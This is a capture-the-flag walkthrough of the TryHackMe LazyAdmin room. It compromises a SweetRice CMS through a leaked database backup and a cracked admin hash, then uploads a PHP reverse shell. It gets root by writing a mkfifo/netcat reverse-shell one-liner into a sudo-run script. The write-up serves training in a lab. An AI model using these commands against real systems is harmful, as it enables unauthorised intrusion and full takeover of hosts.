# LazyAdmin Room Walkthrough

Link: [TryHackMe LazyAdmin Room](https://tryhackme.com/r/room/lazyadmin)

---

## 1. Scanning for Open Ports

First, let's scan the ports using `Rustscan` and `Nmap`:

![Screenshot 2025-01-21 012352](https://github.com/user-attachments/assets/bdfcd73a-d129-453f-b1cf-2d157d711ea8)

```bash
rustscan -a <target-ip>
```

From the scan results, we identify the following open ports:
- Port 80 (HTTP)
- Port 22 (SSH)

---

## 2. Enumerating the Web Server

Next, use `Nmap` to gather more information about the open ports:

![Screenshot 2025-01-21 012419](https://github.com/user-attachments/assets/9466f616-3641-4b12-9883-1a9e4f6e96f1)

After checking the web page, I found just the default page and nothing there. 
So, I tried to brute-force the page directory.

Using a directory brute-forcing tool like `Ffuf`, `dirb`, or `gobuster`, we will find the `content` page:

```bash
ffuf -u http://<target-ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

![Screenshot 2025-01-21 012443](https://github.com/user-attachments/assets/83cf4e06-6ebd-4acb-bfc2-b3b0efdc2283)

![Screenshot 2025-01-21 012605](https://github.com/user-attachments/assets/f274d4d2-0456-413c-9f00-7c0fa625d0f3)

We found just a notice, but there's nothing important there. However, now we know that the page is running with a SweetRice application.

Let's enumerate this directory; we might find something important.

![Screenshot 2025-01-21 012457](https://github.com/user-attachments/assets/7f775fe5-366e-4a32-9c4d-ae84c8fc9627)

We discovered a couple of directories and found the admin login page `/as` directory:

![Screenshot 2025-01-21 012548](https://github.com/user-attachments/assets/fca7ee49-66b1-4a33-9948-519272816ab3)

---

## 3. Exploiting SweetRice

After searching, I found two exploits for this application:

### 1. The MySQL Backup File
`https://www.exploit-db.com/exploits/40718`

![Screenshot 2025-01-21 111050](https://github.com/user-attachments/assets/6e25758c-afa6-4c23-a0c9-7f78eeae5624)

We found here that on `/content/inc/mysql_backup/` we will find a MySQL backup file.

![Screenshot 2025-01-21 110950](https://github.com/user-attachments/assets/0938c8c3-da42-4e42-a45e-20e5e39f72a5)

After downloading the file, search for `pass` in the file. Here's what I found:

![Screenshot 2025-01-21 111823](https://github.com/user-attachments/assets/18c47356-816f-41f1-a1c5-dd55a91d4acd)

Here I found admin credentials:
- Username: `manager`
- Password hash: `42f749ade7f9e195bf475f37a44cafcb`

I tried to crack the hash with `crackstation.net`, and the password is: `Password123`.

![Screenshot 2025-01-21 111944](https://github.com/user-attachments/assets/442ba041-077f-4bd3-98ef-92e9a10c6937)

Now let's try to log in:

![Screenshot 2025-01-21 112006](https://github.com/user-attachments/assets/88d85df6-447b-4604-82cf-18254a6e97b7)

And the login was successful.

### 2. Arbitrary File Upload
`https://www.exploit-db.com/exploits/40716`

Here we find that we can upload files to the website.

![Screenshot 2025-01-21 111159](https://github.com/user-attachments/assets/2ba7e4f6-a20e-45f6-a0a9-21c624d1674e)

After reading the code, I found there's an uploading page on `/as/?type=media_center` where we can upload `.php5` files.

![Screenshot 2025-01-21 111254](https://github.com/user-attachments/assets/f4cd87db-b36c-4d25-8598-101e3051c8a4)

Let's get a PHP reverse shell:

![Screenshot 2025-01-21 112516](https://github.com/user-attachments/assets/ffbdc818-0ea1-4037-b1c5-09abd4d4b04c)

Here we found a code for pentestmonkey on GitHub. Just edit the IP and port, make a `.php5` file, and upload it. Here is the file [rev.php5](https://github.com/karim481/LazyAdmin-Room-Walkthrough/blob/main/rev.php5).

![Screenshot 2025-01-21 112545](https://github.com/user-attachments/assets/30c40fe0-5ae7-4e5b-aa68-f6f4ef770cb4)

Listen on your machine with:

```bash
nc -lvnp <your port>
```

Click on the file to run it:

![Screenshot 2025-01-21 113732](https://github.com/user-attachments/assets/8e68e3e2-5e10-4dcf-ba93-fe9829fd4b66)

---

## 4. Privilege Escalation

After we get the reverse shell, let's try to get root.

After some enumeration, I found an interesting thing with sudo files:

```bash
sudo -l
```

We find that we can run `/home/itguy/backup.pl` with sudo perl without a password.

Reading the file, we see it runs `/etc/copy.sh`, which contains this script:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

We can edit the file with our IP and port to get a reverse shell:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP> <your port> >/tmp/f" >/etc/copy.sh
```

Now listen with:

```bash
nc -lvnp <your port>
```

Run with sudo:

```bash
sudo perl /home/itguy/backup.pl
```

And here we go, we got root:

![Screenshot 2025-01-21 124425](https://github.com/user-attachments/assets/bab99600-875e-4e18-88b2-cfecce5a0f6f)

![Screenshot 2025-01-21 124433](https://github.com/user-attachments/assets/e685b25f-22c8-45ab-861c-6a66fa6a2216)

---

**Happy Hacking!**
